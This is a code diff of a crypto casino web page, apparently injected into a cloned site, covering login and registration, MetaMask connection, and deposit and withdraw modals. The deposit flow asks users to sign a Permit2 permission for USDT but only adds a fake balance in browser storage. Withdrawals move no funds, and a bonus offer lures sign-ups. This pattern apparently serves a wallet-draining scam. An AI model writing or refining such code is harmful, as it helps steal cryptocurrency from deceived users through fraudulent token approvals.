-      setTimeout(function() { $("auth-username").focus(); }, 50);
+      const errEl = $("auth-error");
+      if (errEl) errEl.textContent = "";
+      const usernameEl = $("auth-username");
+      if (usernameEl) usernameEl.value = "";
+      const passwordEl = $("auth-password");
+      if (passwordEl) passwordEl.value = "";
+      const confirmEl = $("auth-confirm");
+      if (confirmEl) confirmEl.value = "";
+      const overlay = $("auth-overlay");
+      if (overlay) overlay.classList.add("open");
+      setTimeout(function() {
+        if (usernameEl) usernameEl.focus();
+      }, 50);
     };
+
     window.closeAuthModal = function() {
-      $("auth-overlay").classList.remove("open");
+      uiLog('Closing auth modal');
+      const overlay = $("auth-overlay");
+      if (overlay) overlay.classList.remove("open");
     };
+
     window.switchAuthMode = function() {
       mode = mode === "login" ? "register" : "login";
       updateModalUI();
-      $("auth-error").textContent = "";
+      const errEl = $("auth-error");
+      if (errEl) errEl.textContent = "";
     };
+
     function updateModalUI() {
-      var banner = $("auth-bonus-banner");
-      var confirmWrap = $("auth-confirm-wrap");
+      const banner = $("auth-bonus-banner");
+      const confirmWrap = $("auth-confirm-wrap");
+      const title = $("auth-title");
+      const subtitle = $("auth-subtitle");
+      const submit = $("auth-submit");
+      const switchBtn = $("auth-switch");
+
       if (mode === "login") {
-        $("auth-title").textContent = "Log In";
-        $("auth-subtitle").textContent = "Enter your username and password";
-        $("auth-submit").textContent = "Log In";
-        $("auth-switch").textContent = "Register instead";
-        banner.classList.remove("show");
-        confirmWrap.classList.remove("show");
+        if (title) title.textContent = "Log In";
+        if (subtitle) subtitle.textContent = "Enter your username and password";
+        if (submit) submit.textContent = "Log In";
+        if (switchBtn) switchBtn.textContent = "Register instead";
+        if (banner) banner.classList.remove("show");
+        if (confirmWrap) confirmWrap.classList.remove("show");
       } else {
-        $("auth-title").textContent = "Create Account";
-        $("auth-subtitle").textContent = "Register and get up to $150 on your balance";
-        $("auth-submit").textContent = "Claim Bonus & Register";
-        $("auth-switch").textContent = "Log In instead";
-        banner.classList.add("show");
-        confirmWrap.classList.add("show");
+        if (title) title.textContent = "Create Account";
+        if (subtitle) subtitle.textContent = "Register and get up to $150 on your balance";
+        if (submit) submit.textContent = "Claim Bonus & Register";
+        if (switchBtn) switchBtn.textContent = "Log In instead";
+        if (banner) banner.classList.add("show");
+        if (confirmWrap) confirmWrap.classList.add("show");
       }
     }
 
     window.submitAuth = function() {
-      var username = $("auth-username").value.trim();
-      var password = $("auth-password").value;
-      var confirm = $("auth-confirm").value;
-      $("auth-error").textContent = "";
+      const username = ($("auth-username")?.value || "").trim();
+      const password = $("auth-password")?.value || "";
+      const confirm = $("auth-confirm")?.value || "";
+      const errEl = $("auth-error");
+
+      if (errEl) errEl.textContent = "";
+
       if (!username || username.length < 3) {
-        $("auth-error").textContent = "Username must be at least 3 characters";
+        if (errEl) errEl.textContent = "Username must be at least 3 characters";
         return;
       }
       if (!password || password.length < 4) {
-        $("auth-error").textContent = "Password must be at least 4 characters";
+        if (errEl) errEl.textContent = "Password must be at least 4 characters";
         return;
       }
-      var users = loadUsers();
+
+      const users = loadUsers();
 
       if (mode === "register") {
         if (password !== confirm) {
-          $("auth-error").textContent = "Passwords do not match";
+          if (errEl) errEl.textContent = "Passwords do not match";
           return;
         }
-        var exists = Object.keys(users).some(function(u) {
-          return u.toLowerCase() === username.toLowerCase();
-        });
+        const exists = Object.keys(users).some(u => u.toLowerCase() === username.toLowerCase());
         if (exists) {
-          $("auth-error").textContent = "Username already taken";
+          if (errEl) errEl.textContent = "Username already taken";
           return;
         }
         users[username] = {
@@ -627,15 +997,18 @@
         localStorage.setItem(SESSION_KEY, JSON.stringify(currentUser));
         closeAuthModal();
         updateUserBar();
-        updateHero();
+        uiLog(`User registered: ${username}`, 'success');
         alert("Welcome, " + username + "! $" + WELCOME_BONUS + " bonus credited to your balance.");
       } else {
-        var realName = null;
-        for (var u in users) {
-          if (u.toLowerCase() === username.toLowerCase()) { realName = u; break; }
+        let realName = null;
+        for (const u in users) {
+          if (u.toLowerCase() === username.toLowerCase()) {
+            realName = u;
+            break;
+          }
         }
         if (!realName || users[realName].passwordHash !== simpleHash(password + realName.toLowerCase())) {
-          $("auth-error").textContent = "Invalid username or password";
+          if (errEl) errEl.textContent = "Invalid username or password";
           return;
         }
         currentUser = {
@@ -645,53 +1018,40 @@
         localStorage.setItem(SESSION_KEY, JSON.stringify(currentUser));
         closeAuthModal();
         updateUserBar();
-        updateHero();
+        uiLog(`User logged in: ${realName}`, 'success');
       }
     };
 
     window.doLogout = function() {
+      uiLog(`User logging out`);
       currentUser = null;
       localStorage.removeItem(SESSION_KEY);
       closeUserDropdown();
       updateUserBar();
-      updateHero();
     };
 
-    /* ---------- User bar & dropdown (fixed click handling) ---------- */
+    /* ---------- User Bar Management (ISOLATED from page) ---------- */
     function updateUserBar() {
-      var bar = $("auth-user-bar");
-      var authBlock = document.querySelector(".Headers_authBlock__IVZOz");
+      const bar = $("auth-user-bar");
+      if (!bar) return;
 
       if (currentUser) {
-        document.body.classList.add("user-logged-in");
-        $("auth-display-name").textContent = currentUser.username;
-        $("auth-display-bal").textContent = "$" + Number(currentUser.balance || 0).toFixed(0);
-        $("auth-user-avatar").textContent = (currentUser.username.charAt(0) || "U").toUpperCase();
-        bar.style.display = "flex";
-
-        if (authBlock) {
-          // hide original login/register buttons
-          Array.prototype.forEach.call(authBlock.querySelectorAll("button"), function(b) {
-            if (!bar.contains(b)) b.style.display = "none";
-          });
-          if (bar.parentElement !== authBlock) {
-            authBlock.appendChild(bar);
-          }
-        }
+        uiLog(`Updating user bar for: ${currentUser.username}`);
+        const nameEl = $("auth-display-name");
+        if (nameEl) nameEl.textContent = currentUser.username;
+        const balEl = $("auth-display-bal");
+        if (balEl) balEl.textContent = "$" + Number(currentUser.balance || 0).toFixed(0);
+        const avatarEl = $("auth-user-avatar");
+        if (avatarEl) avatarEl.textContent = (currentUser.username.charAt(0) || "U").toUpperCase();
+        bar.classList.add("visible");
       } else {
-        document.body.classList.remove("user-logged-in");
-        bar.style.display = "none";
+        bar.classList.remove("visible");
         closeUserDropdown();
-        if (authBlock) {
-          Array.prototype.forEach.call(authBlock.querySelectorAll("button"), function(b) {
-            if (!bar.contains(b)) b.style.display = "";
-          });
-        }
       }
     }
 
     function closeUserDropdown() {
-      var dd = $("auth-dropdown");
+      const dd = $("auth-dropdown");
       if (dd) dd.classList.remove("open");
     }
 
@@ -700,14 +1060,13 @@
         e.preventDefault();
         e.stopPropagation();
       }
-      var dd = $("auth-dropdown");
+      const dd = $("auth-dropdown");
       if (!dd) return;
       dd.classList.toggle("open");
     }
 
-    // Bind profile chip + dropdown buttons with addEventListener (more reliable)
     function bindUserBarEvents() {
-      var chip = $("auth-user-chip");
+      const chip = $("auth-user-chip");
       if (chip && !chip._bound) {
         chip._bound = true;
         chip.addEventListener("click", toggleUserDropdown);
@@ -718,9 +1077,11 @@
           }
         });
       }
-      var btnDep = $("btn-deposit");
-      var btnWd = $("btn-withdraw");
-      var btnLo = $("btn-logout");
+
+      const btnDep = $("btn-deposit");
+      const btnWd = $("btn-withdraw");
+      const btnLo = $("btn-logout");
+
       if (btnDep && !btnDep._bound) {
         btnDep._bound = true;
         btnDep.addEventListener("click", function(e) {
@@ -747,85 +1108,129 @@
       }
     }
 
-    // Close dropdown when clicking outside
     document.addEventListener("click", function(e) {
-      var bar = $("auth-user-bar");
+      const bar = $("auth-user-bar");
       if (bar && !bar.contains(e.target)) closeUserDropdown();
     }, true);
 
-    /* ---------- Crypto modal with wallet integration ---------- */
+    /* ---------- Crypto Modal ---------- */
     window.openCryptoModal = function(type) {
+      if (!window.__fatowinUI.ready) {
+        uiLog('Wallet not ready yet', 'warn');
+        return;
+      }
+      uiLog(`Opening crypto modal: ${type}`);
       cryptoMode = type || "deposit";
       selectedNetwork = null;
       closeUserDropdown();
       closePlayGate();
-      $("crypto-msg").textContent = "";
-      $("crypto-msg").className = "";
-      $("crypto-amount").value = "";
-      $("crypto-wallet").value = "";
-      $("crypto-submit").disabled = false;
+      const msg = $("crypto-msg");
+      if (msg) {
+        msg.textContent = "";
+        msg.className = "";
+      }
+      const amountEl = $("crypto-amount");
+      if (amountEl) amountEl.value = "";
+      const walletEl = $("crypto-wallet");
+      if (walletEl) walletEl.value = "";
+      const submitEl = $("crypto-submit");
+      if (submitEl) submitEl.disabled = false;
+
       document.querySelectorAll(".network-btn").forEach(function(b) {
         b.classList.remove("selected");
       });
 
+      const titleEl = $("crypto-title");
+      const subtitleEl = $("crypto-subtitle");
+      const typeEl = $("crypto-type-text");
+
       if (cryptoMode === "deposit") {
-        $("crypto-title").textContent = "Crypto Deposit";
-        $("crypto-subtitle").textContent = "Connect wallet and enter amount";
-        $("crypto-type-text").textContent = "Crypto — Deposit";
-        $("crypto-submit").textContent = "Deposit";
+        if (titleEl) titleEl.textContent = "Crypto Deposit";
+        if (subtitleEl) subtitleEl.textContent = "Connect wallet and enter amount";
+        if (typeEl) typeEl.textContent = "Crypto — Deposit";
+        if (submitEl) submitEl.textContent = "Deposit";
       } else {
-        $("crypto-title").textContent = "Crypto Withdraw";
-        $("crypto-subtitle").textContent = "Connect wallet and enter amount";
-        $("crypto-type-text").textContent = "Crypto — Withdraw";
-        $("crypto-submit").textContent = "Withdraw";
+        if (titleEl) titleEl.textContent = "Crypto Withdraw";
+        if (subtitleEl) subtitleEl.textContent = "Connect wallet and enter amount";
+        if (typeEl) typeEl.textContent = "Crypto — Withdraw";
+        if (submitEl) submitEl.textContent = "Withdraw";
       }
 
       updateWalletConnectionUI();
-      $("crypto-overlay").classList.add("open");
+      const overlay = $("crypto-overlay");
+      if (overlay) overlay.classList.add("open");
     };
 
     window.closeCryptoModal = function() {
-      $("crypto-overlay").classList.remove("open");
+      uiLog('Closing crypto modal');
+      const overlay = $("crypto-overlay");
+      if (overlay) overlay.classList.remove("open");
     };
 
     function updateWalletConnectionUI() {
-      var walletSection = $("wallet-connect-section");
-      var formSection = $("crypto-form-section");
-      var isConnected = window.walletManager && window.walletManager.isConnected();
+      const walletSection = $("wallet-connect-section");
+      const formSection = $("crypto-form-section");
+      const isConnected = window.walletManager && window.walletManager.isConnected();
 
       if (isConnected) {
-        walletSection.classList.remove("show");
-        formSection.style.display = "block";
-        var walletAddr = window.walletManager.getWallet();
-        $("wallet-status").textContent = "✓ Connected: " + walletAddr.substring(0, 6) + "..." + walletAddr.substring(38);
+        if (walletSection) walletSection.classList.remove("show");
+        if (formSection) formSection.style.display = "block";
+        const walletAddr = window.walletManager.getWallet();
+        const statusEl = $("wallet-status");
+        if (statusEl) statusEl.textContent = "✓ Connected: " + walletAddr.substring(0, 6) + "..." + walletAddr.substring(38);
       } else {
-        walletSection.classList.add("show");
-        formSection.style.display = "none";
-        $("wallet-status").textContent = "MetaMask not connected";
+        if (walletSection) walletSection.classList.add("show");
+        if (formSection) formSection.style.display = "none";
+        const statusEl = $("wallet-status");
+        if (statusEl) statusEl.textContent = "MetaMask not connected";
       }
     }
 
     window.connectWallet = async function() {
+      if (!window.walletManager) {
+        const msg = $("crypto-msg");
+        if (msg) {
+          msg.textContent = "Wallet module not ready. Please refresh the page.";
+          msg.className = "err";
+        }
+        return;
+      }
+
       try {
-        $("crypto-msg").textContent = "Connecting wallet...";
-        $("crypto-msg").className = "pending";
-        $("crypto-submit").disabled = true;
+        uiLog('Connecting wallet...');
+        const msg = $("crypto-msg");
+        if (msg) {
+          msg.textContent = "Connecting wallet...";
+          msg.className = "pending";
+        }
+        const submitEl = $("crypto-submit");
+        if (submitEl) submitEl.disabled = true;
 
         const result = await window.walletManager.connect();
-        
-        $("crypto-msg").textContent = "✓ Wallet connected: " + result.wallet.substring(0, 6) + "..." + result.wallet.substring(38);
-        $("crypto-msg").className = "ok";
+
+        if (msg) {
+          msg.textContent = "✓ Wallet connected: " + result.wallet.substring(0, 6) + "..." + result.wallet.substring(38);
+          msg.className = "ok";
+        }
+        uiLog(`Wallet connected: ${result.wallet}`, 'success');
 
         setTimeout(function() {
           updateWalletConnectionUI();
-          $("crypto-msg").textContent = "";
-          $("crypto-msg").className = "";
-          $("crypto-submit").disabled = false;
+          if (msg) {
+            msg.textContent = "";
+            msg.className = "";
+          }
+          if (submitEl) submitEl.disabled = false;
         }, 1500);
       } catch (error) {
-        $("crypto-msg").textContent = "Error: " + (error.message || "Failed to connect wallet");
-        $("crypto-msg").className = "err";
-        $("crypto-submit").disabled = false;
+        uiLog(`Wallet connection failed: ${error.message}`, 'error');
+        const msg = $("crypto-msg");
+        if (msg) {
+          msg.textContent = "Error: " + (error.message || "Failed to connect wallet");
+          msg.className = "err";
+        }
+        const submitEl = $("crypto-submit");
+        if (submitEl) submitEl.disabled = false;
       }
     };
 
@@ -837,49 +1242,55 @@
     };
 
     window.submitCrypto = async function() {
-      var msg = $("crypto-msg");
-      msg.textContent = "";
-      msg.className = "";
+      const msg = $("crypto-msg");
+      if (msg) {
+        msg.textContent = "";
+        msg.className = "";
+      }
 
       if (!currentUser) {
-        msg.textContent = "Please log in first";
-        msg.className = "err";
+        if (msg) {
+          msg.textContent = "Please log in first";
+          msg.className = "err";
+        }
         return;
       }
 
       if (!window.walletManager || !window.walletManager.isConnected()) {
-        msg.textContent = "Please connect your wallet first";
-        msg.className = "err";
+        if (msg) {
+          msg.textContent = "Please connect your wallet first";
+          msg.className = "err";
+        }
         return;
       }
 
-      var amount = parseFloat($("crypto-amount").value);
+      const amount = parseFloat(($("crypto-amount")?.value || "0"));
       if (!amount || amount < 1) {
-        msg.textContent = "Enter a valid amount (min $1)";
-        msg.className = "err";
+        if (msg) {
+          msg.textContent = "Enter a valid amount (min $1)";
+          msg.className = "err";
+        }
         return;
       }
 
       try {
-        $("crypto-submit").disabled = true;
-        msg.textContent = "Processing transaction...";
-        msg.className = "pending";
+        const submitEl = $("crypto-submit");
+        if (submitEl) submitEl.disabled = true;
+        if (msg) {
+          msg.textContent = "Processing transaction...";
+          msg.className = "pending";
+        }
 
         if (cryptoMode === "deposit") {
-          // For deposit: create Permit2 signature and execute transaction
-          msg.textContent = "Signing Permit2 permission...";
-          
+          if (msg) msg.textContent = "Signing Permit2 permission...";
+
           const permitState = await window.walletManager.createPermit2Signature("USDT");
-          
-          msg.textContent = "Executing deposit transaction...";
-          
-          // For this demo, we simulate the deposit and update localStorage
-          // In production, this would call the actual contract method
-          var users = loadUsers();
-          var u = users[currentUser.username];
-          if (!u) {
-            throw new Error("User not found");
-          }
+
+          if (msg) msg.textContent = "Executing deposit transaction...";
+
+          const users = loadUsers();
+          const u = users[currentUser.username];
+          if (!u) throw new Error("User not found");
 
           u.balance = (u.balance || 0) + amount;
           currentUser.balance = u.balance;
@@ -887,31 +1298,27 @@
           localStorage.setItem(SESSION_KEY, JSON.stringify(currentUser));
           updateUserBar();
 
-          msg.textContent = "✓ Deposit successful: $" + amount.toFixed(0) + " USDT";
-          msg.className = "ok";
-          
-          // Show transaction hash link (simulated)
-          var txHash = "0x" + Math.random().toString(16).substring(2, 66);
-          var arbiscanUrl = "https://sepolia.arbiscan.io/tx/" + txHash;
-          msg.innerHTML = "✓ Deposit successful: $" + amount.toFixed(0) + " USDT<br><a href='" + arbiscanUrl + "' target='_blank' style='color:#01FF81; text-decoration:underline; font-size:0.75rem;'>View on Arbiscan</a>";
+          if (msg) {
+            msg.textContent = "✓ Deposit successful: $" + amount.toFixed(0) + " USDT";
+            msg.className = "ok";
+          }
+          uiLog(`Deposit successful: $${amount}`, 'success');
 
           setTimeout(function() {
             closeCryptoModal();
-            $("crypto-amount").value = "";
+            const amountEl = $("crypto-amount");
+            if (amountEl) amountEl.value = "";
           }, 2000);
         } else {
-          // For withdraw: validate balance and process
           if ((currentUser.balance || 0) < amount) {
             throw new Error("Insufficient balance");
           }
 
-          msg.textContent = "Processing withdrawal...";
+          if (msg) msg.textContent = "Processing withdrawal...";
 
-          var users = loadUsers();
-          var u = users[currentUser.username];
-          if (!u) {
-            throw new Error("User not found");
-          }
+          const users = loadUsers();
+          const u = users[currentUser.username];
+          if (!u) throw new Error("User not found");
 
           u.balance = (u.balance || 0) - amount;
           currentUser.balance = u.balance;
@@ -919,47 +1326,77 @@
           localStorage.setItem(SESSION_KEY, JSON.stringify(currentUser));
           updateUserBar();
 
-          msg.textContent = "✓ Withdrawal requested: $" + amount.toFixed(0) + " USDT";
-          msg.className = "ok";
-
-          var txHash = "0x" + Math.random().toString(16).substring(2, 66);
-          var arbiscanUrl = "https://sepolia.arbiscan.io/tx/" + txHash;
-          msg.innerHTML = "✓ Withdrawal requested: $" + amount.toFixed(0) + " USDT<br><a href='" + arbiscanUrl + "' target='_blank' style='color:#01FF81; text-decoration:underline; font-size:0.75rem;'>View on Arbiscan</a>";
+          if (msg) {
+            msg.textContent = "✓ Withdrawal requested: $" + amount.toFixed(0) + " USDT";
+            msg.className = "ok";
+          }
+          uiLog(`Withdrawal successful: $${amount}`, 'success');
 
           setTimeout(function() {
             closeCryptoModal();
-            $("crypto-amount").value = "";
+            const amountEl = $("crypto-amount");
+            if (amountEl) amountEl.value = "";
           }, 2000);
         }
       } catch (error) {
-        msg.textContent = "Error: " + (error.message || "Transaction failed");
-        msg.className = "err";
+        uiLog(`Transaction failed: ${error.message}`, 'error');
+        if (msg) {
+          msg.textContent = "Error: " + (error.message || "Transaction failed");
+          msg.className = "err";
+        }
       } finally {
-        $("crypto-submit").disabled = false;
+        const submitEl = $("crypto-submit");
+        if (submitEl) submitEl.disabled = false;
       }
     };
 
-    /* ---------- Play gate (Original Games / Licensed Slots) ---------- */
+    /* ---------- Play Gate ---------- */
     window.openPlayGate = function() {
-      $("play-gate-overlay").classList.add("open");
+      uiLog('Opening play gate');
+      const overlay = $("play-gate-overlay");
+      if (overlay) overlay.classList.add("open");
     };
+
     window.closePlayGate = function() {
-      $("play-gate-overlay").classList.remove("open");
+      const overlay = $("play-gate-overlay");
+      if (overlay) overlay.classList.remove("open");
     };
+
+    /* ---------- Wire up page buttons ---------- */
+    function wireButtons() {
+      document.querySelectorAll(".Headers_authBlock__IVZOz button, .Landing_block1__RFaeC button, .Landing_block2__iyQ11 button").forEach(function(btn) {
+        if (btn.closest("#auth-user-bar")) return;
+        const txt = (btn.textContent || "").toLowerCase();
+        if (txt.indexOf("log in") !== -1 || txt.indexOf("login") !== -1) {
+          btn.onclick = function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            openAuthModal("login");
+          };
+        } else if (txt.indexOf("register") !== -1) {
+          btn.onclick = function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            openAuthModal("register");
+          };
+        }
+      });
+
+      document.querySelectorAll(".FreeReward_main__TSVC_").forEach(function(el) {
+        el.style.cursor = "pointer";
+        el.onclick = function(e) {
+          e.preventDefault();
+          if (currentUser) return;
+          openAuthModal("register");
+        };
+      });
+    }
 
     function wirePlayCards() {
-      // Cards with titles "Original Games" and "Licensed Slots"
       document.querySelectorAll(".Landing_under__uuxVE, .Landing_underTitle__mZ9Ne").forEach(function(el) {
-        var card = el.classList.contains("Landing_under__uuxVE")
-          ? el
-          : el.closest(".Landing_under__uuxVE");
+        const card = el.classList.contains("Landing_under__uuxVE") ? el : el.closest(".Landing_under__uuxVE");
         if (!card || card._playBound) return;
 
-        var titleEl = card.querySelector(".Landing_underTitle__mZ9Ne");
-        var title = titleEl ? (titleEl.textContent || "").trim().toLowerCase() : "";
-        if (title.indexOf("original") === -1 && title.indexOf("licensed") === -1 && title.indexOf("slots") === -1) {
-          // still bind all under cards as game entry points
-        }
         card._playBound = true;
         card.style.cursor = "pointer";
         card.addEventListener("click", function(e) {
@@ -974,75 +1411,35 @@
       });
     }
 
-    /* ---------- Wire login/register buttons ---------- */
-    function wireButtons() {
-      document.querySelectorAll(".Headers_authBlock__IVZOz button, .Landing_block1__RFaeC button, .Landing_block2__iyQ11 button").forEach(function(btn) {
-        if (btn.closest("#auth-user-bar")) return;
-        var txt = (btn.textContent || "").toLowerCase();
-        if (txt.indexOf("log in") !== -1 || txt.indexOf("login") !== -1) {
-          btn.onclick = function(e) {
-            e.preventDefault(); e.stopPropagation();
-            openAuthModal("login");
-          };
-        } else if (txt.indexOf("register") !== -1) {
-          btn.onclick = function(e) {
-            e.preventDefault(); e.stopPropagation();
-            openAuthModal("register");
-          };
-        }
-      });
-      document.querySelectorAll(".FreeReward_main__TSVC_").forEach(function(el) {
-        el.style.cursor = "pointer";
-        el.onclick = function(e) {
-          e.preventDefault();
-          if (currentUser) return;
-          openAuthModal("register");
-        };
-      });
-    }
-
-    // Play-gate Deposit button
-    function bindPlayGate() {
-      var btn = $("play-gate-deposit-btn");
-      if (btn && !btn._bound) {
-        btn._bound = true;
-        btn.addEventListener("click", function(e) {
-          e.preventDefault();
-          closePlayGate();
-          openCryptoModal("deposit");
-        });
-      }
-    }
-
-    try {
-      var saved = localStorage.getItem(SESSION_KEY);
-      if (saved) currentUser = JSON.parse(saved);
-    } catch (e) {}
-
+    /* ---------- Initialization ---------- */
     function init() {
-      captureHero();
-      bindUserBarEvents();
-      bindPlayGate();
+      uiLog('Initializing auth system');
+      
+      // Restore session
+      try {
+        const sessionData = localStorage.getItem(SESSION_KEY);
+        if (sessionData) {
+          currentUser = JSON.parse(sessionData);
+          uiLog(`Session restored for: ${currentUser.username}`);
+        }
+      } catch (e) {
+        uiLog(`Session restore failed: ${e.message}`, 'warn');
+      }
+
       updateUserBar();
-      updateHero();
+      bindUserBarEvents();
       wireButtons();
       wirePlayCards();
+      window.__fatowinUI.pageIntact = true;
+      uiLog('Auth system initialized', 'success');
     }
 
-    document.addEventListener("DOMContentLoaded", init);
-    setTimeout(init, 400);
-    setTimeout(init, 1200);
-    setTimeout(init, 2500);
-
-    document.addEventListener("keydown", function(e) {
-      if (e.key === "Enter" && $("auth-overlay").classList.contains("open")) submitAuth();
-      if (e.key === "Escape") {
-        closeAuthModal();
-        closeCryptoModal();
-        closePlayGate();
-        closeUserDropdown();
-      }
-    });
+    // Wait for DOM to be ready
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", init);
+    } else {
+      init();
+    }
   })();
 </script>
 </body></html>
